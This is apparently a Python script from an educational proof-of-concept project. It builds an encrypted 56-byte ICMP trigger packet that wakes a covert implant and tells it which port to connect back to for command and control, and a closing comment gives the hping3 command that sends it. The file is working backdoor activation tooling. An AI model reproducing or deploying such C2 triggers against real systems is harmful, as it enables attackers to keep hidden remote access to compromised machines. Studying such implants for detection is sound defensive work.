"""
The structure the payload to activate the implant.
The total payload size is exactly 56 bytes. 
Because default ping size (in linux) is 64 bytes.
8 Bytes for the ICMP header and the rest for data.

This is a PoC / Educational project. So the 'SW4L' tag
isn't an OPSEC problem. It's added mindfully. 

One thing is modified, the port to connect to,
is also going to be in this crafted packet. So the implant
doesn't have a static C2_PORT=4444 like of thing. 
It is going to adapt to circumstances that the C2 decides.

SW4L marker  :  4 bytes
nonce        : 12 bytes
ciphertext   : 29 bytes (port included)
Padding      : 11 bytes
-----------------------
Total final  : 56 bytes ✓
"""

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import struct
import os

PORT = 5555

with open("key.hex", "r") as f:
    key = bytes.fromhex(f.read().strip())

aesgcm = AESGCM(key)

nonce = os.urandom(12)

message = b"Open sesame" + struct.pack(">H", PORT)

ciphertext = aesgcm.encrypt(nonce, message, associated_data=None)

payload = b"SW4L"
payload += nonce
payload += ciphertext
payload += os.urandom(11)

print("Length payload: ", len(payload))
print(payload)

with open("payload.bin", "wb") as payload_file:
    payload_file.write(payload)

# send this file with hping3
# -> sudo hping3 -1 -E payload.bin -d 56 -c 1 127.0.0.1